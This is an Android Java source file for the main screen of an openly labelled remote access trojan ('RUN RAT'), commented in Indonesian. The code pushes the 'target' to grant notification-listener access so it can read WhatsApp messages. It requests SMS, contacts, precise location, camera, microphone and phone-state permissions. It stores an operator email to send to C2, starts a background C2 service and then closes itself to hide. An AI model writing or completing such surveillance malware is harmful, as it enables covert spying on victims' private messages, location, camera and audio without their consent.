package com.r.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        
        // Cek apakah izin akses notifikasi (buat baca WA) udah aktif
        if (!Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners").contains(getPackageName())) {
            // Kalau belum, arahkan target ke settingan (nggak bikin FC)
            try {
                startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
            } catch (Exception e) {}
        }

        // Bikin tampilan sederhana (Email + Tombol RUN)
        android.widget.LinearLayout layout = new android.widget.LinearLayout(this);
        layout.setOrientation(android.widget.LinearLayout.VERTICAL);
        layout.setPadding(50, 50, 50, 50);
        layout.setBackgroundColor(0xFF050505);

        EditText email = new EditText(this);
        email.setHint("Masukkan Email Operator");
        email.setTextColor(0xFFFFFFFF);
        email.setHintTextColor(0xFFAAAAAA);
        layout.addView(email);

        Button runBtn = new Button(this);
        runBtn.setText("RUN RAT");
        runBtn.setBackgroundColor(0xFFFF3355);
        runBtn.setTextColor(0xFF000000);
        layout.addView(runBtn);

        setContentView(layout);

        // Aksi saat tombol RUN RAT ditekan
        runBtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String inputEmail = email.getText().toString();
                if (inputEmail.isEmpty()) {
                    Toast.makeText(MainActivity.this, "Email tidak boleh kosong", Toast.LENGTH_SHORT).show();
                    return;
                }
                
                // Simpan email (opsional, buat nanti dikirim ke C2)
                getSharedPreferences("rat", MODE_PRIVATE).edit().putString("email", inputEmail).apply();
                
                // Jalankan service C2 di background
                startService(new Intent(MainActivity.this, C2Service.class));
                
                Toast.makeText(MainActivity.this, "RAT Berjalan...", Toast.LENGTH_SHORT).show();
                
                // Sembunyikan aplikasi setelah di-run
                finish();
            }
        });

        // Minta izin dengan aman (nggak bikin FC)
        if (Build.VERSION.SDK_INT >= 23) {
            requestPermissions(new String[]{
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_PHONE_STATE
            }, 1);
        }
    }
    }
